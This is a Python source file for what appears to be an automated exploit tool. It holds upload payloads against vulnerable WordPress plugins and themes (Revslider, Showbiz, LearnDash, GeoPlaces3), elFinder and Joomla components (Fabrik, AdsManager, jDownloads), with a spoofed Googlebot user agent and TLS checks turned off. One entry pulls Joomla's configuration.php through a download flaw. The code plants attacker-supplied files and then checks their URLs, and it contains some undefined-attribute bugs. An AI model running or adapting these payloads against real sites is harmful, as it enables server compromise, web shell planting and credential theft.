#-*- codinng: utf-8 -*-
import requests,sys,os,urllib3,datetime
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class uploadhandler(object):

      def __init__(self,target,path1=None,path2=None,post_data=None,files_data=None):
          self.target = target
          self.path1 = path1
          self.path2 = path2
          self.post_data = post_data
          self.files_data = files_data
          self.user_agent = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}

      def post(self):
          r = requests.post(
            f'{self.target}{self.path1}',
            data=self.post_data,
            files=self.files_data,
            headers = self.user_agent,
            verify=False
          )
          return r

      def get_check(self):
          r = requests.get(f'{self.target}{self.path2}',headers=self.user_agent,verify=False)
          return r
          
class post_data(object):

      def __init__(self,path_files,name_files):
          self.path = path_files
          self.name = name_files

      @property    
      def wp_revslider(self):
          return {
            'data':{
                'action':'revslider_ajax_action',
                'client_action':'update_plugin'
            },
            'files':{
                'update_file':(self.name,open(self.path,'r').read())
            },
            1:'/wp-admin/admin-ajax.php',
            2:'/wp-content/plugins/revslider/temp/update_extract/' + self.name
          }     
               
      @property
      def wp_learndash(self):
          return {
            'data':{
                'post':'foobar',
                'course_id':'foobar',
                'uploadfile':'foobar'
            },
            'files':{
                'uploadfiles[]':(self.name,open(self.path,'r').read())
            },
            1:'/wp-content/uploads/assignments/' + self.name
          }
          
      @property
      def wp_showbiz(self):
          return {
            'data':{
                'action':'showbiz_ajax_action',
                'client_action':'update_plugin'
            },
            'files':{
                'update_file':(self.name,open(self.path,"r").read())
            },
            1:'/wp-admin/admin-ajax.php',
            2:'/wp-content/plugins/showbiz/temp/update_extract/' + self.name
          }
          
      @property
      def wp_audio_control(self):
          return {
            'data':{
                'audio-filename':self.name,
                'action':'save_record',
                'course_id':'undefined',
                'unit_id':'undefined'
            },
            'files':{
                'audio-blob':('blob',open(self.path_file,'r').read())                                
            },
            1:'/wp-admin/admin-ajax.php',
            2:f'/wp-content/uploads/{datetime.datetime.now().year}/{datetime.datetime.now().month:02}/{self.name}'
          }
      @property
      def wp_geoplace3(self):
          return {
            'files':{
                'Filedata':(self.name,open(self.path,'r').read())
            },
            1:'/wp-content/themes/GeoPlaces3/library/includes/upload.php',
            2:'/wp-content/uploads/tmp/' + self.name
          }
          
      @property
      def wp_pugeot_music(self):    
          return {
            'data':{
                'name':self.name
            },
            'files':{
                'file':(self.name,open(self.path,'r').read())
            },
            1:'/wp-content/plugins/peugeot-music-plugin/js/plupload/examples/upload.php',
            2:'/wp-content/plugins/peugeot-music-plugin/js/plupload/examples/uploads/' + self.name
          }
          
      @property    
      def elfinder(self):
          return {
            'data':{
                'cmd':'put',
                'target':'l1_' + self.name,
                'content':(open(self.path,'r').read())
            },
            1:'/elFinder/php/connector.php?cmd=mkfile&name=more.php&target=l1_Lw',
            2:'/elFinder/files/' + self.name
          }

      @property    
      def com_fabrik(self):
          return {
            'data':{
                "name": self.name,
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            },
            'files':{
                'userfile':(self.name,open(self.path,'r').read(),'multipart/form-data')
            },
            1:'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=',
            2:'/media/' + self.name
          }  

      @property    
      def com_ads_manager(self):
          return {
            'data':{
                'name':self.name
            },
            'files':{
                'file':open(self.path,'r').read()
            },
            1:'/index.php?option=com_adsmanager&task=upload&tmpl=component',
            2:'/tmp/plupload/' + self.name
          }
          
      @property    
      def joom_manager_get_config(self):
          return {
            1:'/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'
          }    
          
      
      def com_jdownloads(self,mail):
          return {
            'data':{
                'name': '407AEX',
                'mail': self.email,
                'catlist': '1',
                'filetitle': "407 AEX",
                'description': "<p>407 Aex</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': 'Test',
                'option': "com_jdownloads",
                'view':'upload'
            },
            'files':{
                'file_upload':(self.name,open(self.path,'r').read(),'multipart/form-data'),
                'pic_upload':(self.name,open(self.path,'r').read(),'multipart/form-data')
            },
            1:'/index.php?option=com_jdownloads&Itemid=0&view=upload',
            2:'/images/jdownloads/screenshots/' + self.name
          }          
